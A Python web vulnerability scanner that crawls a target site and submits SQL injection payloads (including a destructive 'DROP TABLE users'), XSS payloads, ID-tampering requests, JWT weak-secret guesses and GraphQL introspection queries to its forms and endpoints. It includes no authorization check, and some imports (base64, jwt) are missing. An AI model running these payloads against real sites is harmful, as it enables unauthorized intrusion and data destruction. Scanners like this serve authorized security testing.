import requests
from bs4 import BeautifulSoup
import re
import json
from urllib.parse import urljoin, urlparse
import time
import random
import string


class AdvancedWebAppTester:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })
        self.results = []
        self.crawled_urls = set()

    def crawl_website(self, max_pages=50):
        """Crawl the website to discover pages and forms"""
        def crawl_page(url, depth=0):
            if depth > 2 or url in self.crawled_urls or len(self.crawled_urls) >= max_pages:
                return

            self.crawled_urls.add(url)

            try:
                response = self.session.get(url, timeout=10)
                if response.status_code != 200:
                    return

                soup = BeautifulSoup(response.text, 'html.parser')

                # Extract forms
                forms = soup.find_all('form')
                for form in forms:
                    self.analyze_form(form, url)

                # Extract links
                for link in soup.find_all('a', href=True):
                    href = link.get('href')
                    if href and not href.startswith('javascript:'):
                        next_url = urljoin(url, href)
                        if self.is_same_domain(next_url):
                            crawl_page(next_url, depth + 1)
            except Exception as e:
                print(f"Error crawling {url}: {e}")

        crawl_page(self.target_url)
        return self.crawled_urls

    def is_same_domain(self, url):
        """Check if URL belongs to the same domain"""
        target_domain = urlparse(self.target_url).netloc
        url_domain = urlparse(url).netloc
        return target_domain == url_domain

    def analyze_form(self, form, page_url):
        """Analyze a form for security vulnerabilities"""
        action = form.get('action', '')
        method = form.get('method', 'get').lower()
        inputs = form.find_all('input')

        # Construct form URL
        form_url = urljoin(page_url, action)

        # Test for CSRF
        csrf_result = self.test_csrf_protection(form, form_url)
        if csrf_result:
            self.results.append(csrf_result)

        # Test for SQL injection
        sqli_result = self.test_sql_injection(form, form_url)
        if sqli_result:
            self.results.append(sqli_result)

        # Test for XSS
        xss_result = self.test_xss(form, form_url)
        if xss_result:
            self.results.append(xss_result)

        # Test for parameter tampering
        tampering_result = self.test_parameter_tampering(form, form_url)
        if tampering_result:
            self.results.append(tampering_result)

    def test_csrf_protection(self, form, form_url):
        """Test form for CSRF protection"""
        # Check for CSRF tokens
        csrf_token_names = ['csrf_token', 'authenticity_token',
                            '_token', 'anticsrf', 'csrfmiddlewaretoken']

        has_csrf_token = False
        for input_tag in form.find_all('input'):
            name = input_tag.get('name', '').lower()
            if any(token_name in name for token_name in csrf_token_names):
                has_csrf_token = True
                break

        if not has_csrf_token:
            return {
                'type': 'Missing CSRF Protection',
                'severity': 'High',
                'description': f"Form at {form_url} does not have CSRF protection",
                'url': form_url
            }

        return None

    def test_sql_injection(self, form, form_url):
        """Test form for SQL injection vulnerabilities"""
        method = form.get('method', 'get').lower()

        # SQL injection payloads
        sqli_payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "' UNION SELECT NULL--",
            "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
            "' AND SLEEP(5)--",
            "'; DROP TABLE users--"
        ]

        for payload in sqli_payloads:
            data = {}

            # Prepare form data
            for input_tag in form.find_all('input'):
                name = input_tag.get('name')
                input_type = input_tag.get('type', 'text')

                if name:
                    if input_type in ['text', 'search', 'hidden']:
                        data[name] = payload
                    elif input_type == 'submit':
                        data[name] = input_tag.get('value', 'Submit')

            # Send request
            try:
                start_time = time.time()
                if method == 'post':
                    response = self.session.post(
                        form_url, data=data, timeout=10)
                else:
                    response = self.session.get(
                        form_url, params=data, timeout=10)
                response_time = time.time() - start_time

                # Check for SQL injection indicators
                if any(indicator in response.text.lower() for indicator in ['sql syntax', 'mysql_fetch', 'ora-00936', 'microsoft ole db provider']):
                    return {
                        'type': 'SQL Injection',
                        'severity': 'Critical',
                        'description': f"SQL injection vulnerability detected at {form_url} with payload: {payload}",
                        'url': form_url,
                        'payload': payload
                    }

                # Check for time-based SQL injection
                if response_time > 5:
                    return {
                        'type': 'Time-Based SQL Injection',
                        'severity': 'High',
                        'description': f"Time-based SQL injection detected at {form_url} with payload: {payload}",
                        'url': form_url,
                        'payload': payload
                    }
            except Exception as e:
                print(f"Error testing SQL injection: {e}")

        return None

    def test_xss(self, form, form_url):
        """Test form for XSS vulnerabilities"""
        method = form.get('method', 'get').lower()

        # XSS payloads
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src='x' onerror=\"alert('XSS')\">",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')>",
            "'\"><script>alert('XSS')</script>"
        ]

        for payload in xss_payloads:
            data = {}

            # Prepare form data
            for input_tag in form.find_all('input'):
                name = input_tag.get('name')
                input_type = input_tag.get('type', 'text')

                if name:
                    if input_type in ['text', 'search', 'hidden']:
                        data[name] = payload
                    elif input_type == 'submit':
                        data[name] = input_tag.get('value', 'Submit')

            # Send request
            try:
                if method == 'post':
                    response = self.session.post(
                        form_url, data=data, timeout=10)
                else:
                    response = self.session.get(
                        form_url, params=data, timeout=10)

                # Check for XSS in response
                if payload in response.text:
                    return {
                        'type': 'XSS',
                        'severity': 'High',
                        'description': f"XSS vulnerability detected at {form_url} with payload: {payload}",
                        'url': form_url,
                        'payload': payload
                    }
            except Exception as e:
                print(f"Error testing XSS: {e}")

        return None

    def test_parameter_tampering(self, form, form_url):
        """Test form for parameter tampering vulnerabilities"""
        method = form.get('method', 'get').lower()

        # Get original form data
        original_data = {}
        for input_tag in form.find_all('input'):
            name = input_tag.get('name')
            value = input_tag.get('value', '')

            if name:
                original_data[name] = value

        # Try tampering with parameters
        for param in original_data:
            if param.lower() in ['id', 'user_id', 'product_id', 'order_id']:
                tampered_data = original_data.copy()
                tampered_data[param] = '1'  # Try to access resource with ID 1

                try:
                    if method == 'post':
                        response = self.session.post(
                            form_url, data=tampered_data, timeout=10)
                    else:
                        response = self.session.get(
                            form_url, params=tampered_data, timeout=10)

                    # Check if we got access to a different resource
                    if 'unauthorized' not in response.text.lower() and 'access denied' not in response.text.lower():
                        return {
                            'type': 'Parameter Tampering',
                            'severity': 'Medium',
                            'description': f"Parameter tampering vulnerability detected at {form_url} for parameter: {param}",
                            'url': form_url,
                            'parameter': param
                        }
                except Exception as e:
                    print(f"Error testing parameter tampering: {e}")

        return None

    def test_jwt_security(self):
        """Test for JWT security vulnerabilities"""
        # Look for JWT tokens in responses
        response = self.session.get(self.target_url, timeout=10)

        # JWT pattern
        jwt_pattern = r'eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*'
        tokens = re.findall(jwt_pattern, response.text)

        for token in tokens:
            # Test for 'none' algorithm vulnerability
            try:
                parts = token.split('.')
                header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))

                if 'alg' in header and header['alg'].lower() == 'none':
                    self.results.append({
                        'type': 'JWT None Algorithm',
                        'severity': 'High',
                        'description': f"JWT token uses 'none' algorithm: {token[:20]}...",
                        'url': self.target_url
                    })

                # Test for weak secret
                if 'alg' in header and header['alg'].lower() == 'hs256':
                    # Try to crack the secret with common passwords
                    common_secrets = ['secret', 'password',
                                      'api_key', 'jwt_secret']
                    for secret in common_secrets:
                        try:
                            decoded = jwt.decode(
                                token, secret, algorithms=['HS256'])
                            self.results.append({
                                'type': 'Weak JWT Secret',
                                'severity': 'High',
                                'description': f"JWT token cracked with weak secret: {secret}",
                                'url': self.target_url
                            })
                            break
                        except:
                            pass
            except:
                pass

    def test_api_security(self):
        """Test API endpoints for security vulnerabilities"""
        # Common API paths
        api_paths = ['/api', '/rest', '/graphql',
                     '/v1', '/v2', '/swagger', '/openapi.json']

        for path in api_paths:
            url = urljoin(self.target_url, path)
            try:
                response = self.session.get(url, timeout=10)
                if response.status_code == 200:
                    # Test for API-specific vulnerabilities
                    if 'graphql' in path:
                        self.test_graphql_security(url)
                    elif 'swagger' in path or 'openapi' in path:
                        self.results.append({
                            'type': 'Exposed API Documentation',
                            'severity': 'Medium',
                            'description': f"API documentation is exposed at {url}",
                            'url': url
                        })
            except:
                pass

    def test_graphql_security(self, url):
        """Test GraphQL endpoint for security vulnerabilities"""
        # Test for GraphQL introspection
        introspection_query = {
            "query": "{__schema{types{name}}}"
        }

        try:
            response = self.session.post(
                url, json=introspection_query, timeout=10)
            if response.status_code == 200 and '__schema' in response.text:
                self.results.append({
                    'type': 'GraphQL Introspection',
                    'severity': 'High',
                    'description': f"GraphQL introspection is enabled at {url}",
                    'url': url
                })
        except:
            pass

    def run_tests(self):
        """Run all web application security tests"""
        print(
            f"[*] Starting advanced web application security testing for {self.target_url}")

        # Crawl website
        print("[*] Crawling website to discover pages and forms...")
        crawled_urls = self.crawl_website()
        print(f"[*] Crawled {len(crawled_urls)} pages")

        # Test JWT security
        print("[*] Testing JWT security...")
        self.test_jwt_security()

        # Test API security
        print("[*] Testing API security...")
        self.test_api_security()

        return self.results
